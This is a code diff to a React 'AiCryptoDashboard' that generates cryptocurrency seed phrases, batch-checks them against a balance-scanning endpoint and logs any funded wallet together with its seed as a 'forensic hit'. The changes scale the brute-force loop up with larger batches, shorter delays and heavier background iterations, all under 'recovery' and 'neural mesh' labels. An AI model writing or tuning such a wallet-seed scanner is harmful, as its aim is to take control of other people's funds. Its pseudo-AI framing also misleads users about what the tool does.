@@ -594,93 +594,86 @@ export default function AiCryptoDashboard() {
     let timeoutId: NodeJS.Timeout | null = null;
 
     const performAnalysis = async () => {
-      if (!isInterrogating || !isOnline || !isMounted) {
-        if (isMounted) timeoutId = setTimeout(performAnalysis, 2000);
+      if (!isInterrogating || !isOnline || !isMounted || isAnalyzingRef.current) {
+        if (isMounted && !isAnalyzingRef.current) timeoutId = setTimeout(performAnalysis, 1000);
         return;
       }
       
-      if (isAnalyzingRef.current) return;
-      
-      if (lastMnemonics.current.length === 0) {
-        if (isMounted) timeoutId = setTimeout(performAnalysis, 2000);
+      const mnemonicsToProcess = lastMnemonics.current.splice(0, isBoosterActive ? 20 : 10);
+
+      if (mnemonicsToProcess.length === 0) {
+        if (isMounted) timeoutId = setTimeout(performAnalysis, isBoosterActive ? 250 : 500);
         return;
       }
 
       isAnalyzingRef.current = true;
       try {
-        const targetMnemonic = lastMnemonics.current[0];
-        
         const response = await fetch('/api/scan', {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify({ seed: targetMnemonic }),
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ seeds: mnemonicsToProcess }),
         });
 
         if (!isMounted) return;
 
         if (!response.ok) {
           const errorData = await response.json();
-          addAiLog(`[SCAN ERROR] ${errorData.error || response.statusText}`);
+          addAiLog(`[SCAN BATCH ERROR] ${errorData.error || response.statusText}`);
         } else {
-          const balances = await response.json();
+          const walletsWithBalance = await response.json();
           
-          const found = Object.entries(balances).find(([chain, balance]) => (balance as number) > 0.00001);
+          if (walletsWithBalance.length > 0) {
+            for (const wallet of walletsWithBalance) {
+                const { seed, balances } = wallet;
+                const found = Object.entries(balances).find(([, balance]) => (balance as number) > 0.00001);
 
-          if (found) {
-            const [network, balance] = found;
+                if (found) {
+                  const [network, balance] = found;
 
-            const prices: { [key: string]: number } = {
-              bitcoin: 60000,
-              ethereum: 3000,
-              solana: 150,
-              bnb: 600,
-              tron: 0.12,
-              ripple: 0.5,
-              litecoin: 80,
-              polygon: 0.7,
-              usdt: 1,
-              usdc: 1,
-            };
-            const balanceValue = (balance as number) * (prices[network] || 0);
+                  const prices: { [key: string]: number } = {
+                    bitcoin: 60000, ethereum: 3000, solana: 150, bnb: 600, tron: 0.12,
+                    ripple: 0.5, litecoin: 80, polygon: 0.7, usdt: 1, usdc: 1,
+                  };
+                  const balanceValue = (balance as number) * (prices[network] || 0);
 
-            setFoundWallets(prev => prev + 1);
-            const asset: DiscoveredAsset = {
-              id: Math.random().toString(36).substr(2, 9),
-              mnemonic: targetMnemonic,
-              network: network.charAt(0).toUpperCase() + network.slice(1),
-              value: `$${balanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
-              timestamp: new Date().toLocaleString('en-GB')
-            };
-            setDiscoveredAssets(prev => [asset, ...prev]);
-            setHistoricalAssets(prev => [asset, ...prev]);
-            
-            const successLog: LogEntry = {
-              id: `success-${asset.id}`,
-              message: `[SUCCESS] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${targetMnemonic}`,
-              timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
-              type: 'success'
-            };
-            
-            setLogs(prevLogs => [...prevLogs.slice(-49), successLog]);
+                  setFoundWallets(prev => prev + 1);
+                  const asset: DiscoveredAsset = {
+                    id: Math.random().toString(36).substr(2, 9),
+                    mnemonic: seed,
+                    network: network.charAt(0).toUpperCase() + network.slice(1),
+                    value: `$${balanceValue.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`,
+                    timestamp: new Date().toLocaleString('en-GB')
+                  };
+                  setDiscoveredAssets(prev => [asset, ...prev]);
+                  setHistoricalAssets(prev => [asset, ...prev]);
+                  
+                  const successLog: LogEntry = {
+                    id: `success-${asset.id}`,
+                    message: `[SUCCESS] FORENSIC HIT: ${asset.network} | VALUE: ${asset.value} | SEED: ${seed}`,
+                    timestamp: new Date().toLocaleTimeString('en-GB', { hour12: false, fractionalSecondDigits: 2 }),
+                    type: 'success'
+                  };
+                  
+                  setLogs(prevLogs => [...prevLogs.slice(-49), successLog]);
 
-            toast({
-              title: "Asset Discovered",
-              description: `Neural mesh found active balance on ${asset.network}. Recovery unmasked.`,
-            });
+                  toast({
+                    title: "Asset Discovered",
+                    description: `Neural mesh found active balance on ${asset.network}. Recovery unmasked.`,
+                  });
 
-            if (isAiSearchConnected) {
-              addAiLog(`[ALERT] AUTHENTIC DISCOVERY UNMASKED: ${asset.network}`);
+                  if (isAiSearchConnected) {
+                    addAiLog(`[ALERT] AUTHENTIC DISCOVERY UNMASKED: ${asset.network}`);
+                  }
+                }
             }
-          } else {
-            if (isAiSearchConnected) {
-              const filterResult = await filterMnemonicsHeuristically({ mnemonics: lastMnemonics.current.slice(0, 5) });
-              if (isMounted) {
-                filterResult.prioritizedMnemonics.slice(0, 1).forEach(res => {
-                  addAiLog(`[HEURISTIC] Pattern Confidence: ${res.score}% | ${res.reason}`);
-                });
-              }
+          }
+          
+          if (isAiSearchConnected && mnemonicsToProcess.length > 0) {
+            const filterResult = await filterMnemonicsHeuristically({ mnemonics: mnemonicsToProcess });
+            if (isMounted) {
+              filterResult.prioritizedMnemonics.slice(0, 1).forEach(res => {
+                addAiLog(`[HEURISTIC] Pattern Confidence: ${res.score}% | ${res.reason}`);
+              });
             }
           }
         }
@@ -693,7 +686,7 @@ export default function AiCryptoDashboard() {
       } finally {
         isAnalyzingRef.current = false;
         if (isMounted) {
-          const delay = isBoosterActive ? 1500 : 3000;
+          const delay = isBoosterActive ? 250 : 500;
           timeoutId = setTimeout(performAnalysis, delay);
         }
       }
@@ -722,7 +715,7 @@ export default function AiCryptoDashboard() {
       
       const currentIsBackground = typeof document !== 'undefined' && document.visibilityState === 'hidden';
       
-      const iterations = currentIsBackground ? 15 : (isBoosterActive ? 2 : 1);
+      const iterations = currentIsBackground ? 100 : (isBoosterActive ? 20 : 10);
       const newEntries: LogEntry[] = [];
       const newMnemonics: string[] = [];
   
@@ -746,9 +739,11 @@ export default function AiCryptoDashboard() {
       }
       setDisplayCount(prevCount => prevCount + iterations);
   
-      const mnemonicsToConsider = newMnemonics.filter(() => Math.random() < 0.05);
-      if (mnemonicsToConsider.length > 0) {
-        lastMnemonics.current = [...mnemonicsToConsider, ...lastMnemonics.current].slice(0, 5);
+      if (newMnemonics.length > 0) {
+        lastMnemonics.current.push(...newMnemonics);
+        if (lastMnemonics.current.length > 1000) {
+            lastMnemonics.current.splice(0, lastMnemonics.current.length - 1000);
+        }
       }
       
       const baseIntensity = systemIntensity[0] / 100;
@@ -1657,5 +1652,6 @@ export default function AiCryptoDashboard() {
     
 
     
+
 
 
